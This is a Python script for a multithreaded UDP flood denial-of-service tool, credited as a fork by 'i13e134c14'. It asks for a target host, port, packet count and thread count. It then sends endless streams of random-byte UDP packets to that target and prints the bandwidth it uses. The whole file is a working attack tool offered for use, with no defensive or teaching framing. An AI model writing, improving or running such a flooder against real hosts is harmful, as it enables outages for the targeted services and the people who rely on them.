import socket
import random
import threading
import time

print("UDP DOS Custom by i13e134c14 Fork from Sharktsc-cat")
print("This is normal power UDP Flood")
ip = str(input("Host/Ip:"))
port = int(input("Port:"))
times = int(input("Packets per one connection:"))
threads = int(input("Threads:"))
length_string = "03456"

# Variables for bandwidth and time tracking
start_time = time.time()
total_bytes_sent = 0

# Variable for total bandwidth tracking
total_bandwidth = 0

# Variable to check if threads should keep running
running = True

def run():
    global total_bytes_sent
    global total_bandwidth

    data = random._urandom(1024)
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            i = random.choice(length_string)
            length = int(i)
            addr = (str(ip), int(port))
            data2 = random._urandom(length)

            # Send smaller data packet
            s.sendto(data2, addr)
            bytes_sent = len(data2)
            total_bytes_sent += bytes_sent
            total_bandwidth += bytes_sent
            s.close()

            # Send bigger data packets based on times
            for x in range(times):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, addr)
                bytes_sent = len(data)
                total_bytes_sent += bytes_sent
                total_bandwidth += bytes_sent
                s.close()

        except Exception as e:
            print("[!] Error:", e)

def monitor_bandwidth():
    global start_time
    global total_bytes_sent

    while running:
        elapsed_time = time.time() - start_time
        if elapsed_time < 0.001:  # Prevent division by extremely small numbers
            elapsed_time = 0.001

        bandwidth_rate = total_bytes_sent / (1024 ** 2)  # MB/s
        print(f"Time elapsed: {elapsed_time:.2f} seconds - UDP Sent - Bandwidth Rate: {bandwidth_rate:.2f} MB/s")
        total_bytes_sent = 0
        time.sleep(1)

# Start the bandwidth monitor thread
monitor_thread = threading.Thread(target=monitor_bandwidth)
monitor_thread.start()

# Start the flood threads
thread_list = []
for y in range(threads):
    th = threading.Thread(target=run)
    th.start()
    thread_list.append(th)

try:
    while threading.active_count() > 1:
        for t in thread_list:
            t.join(0.1)
except KeyboardInterrupt:
    print("\nStopping...")
    running = False
    elapsed_time = time.time() - start_time
    bandwidth_total = total_bandwidth / (1024 ** 2)  # Total MB sent
    print(f"Summary: Total time elapsed: {elapsed_time:.2f} seconds - Total Bandwidth Used: {bandwidth_total:.2f} MB")
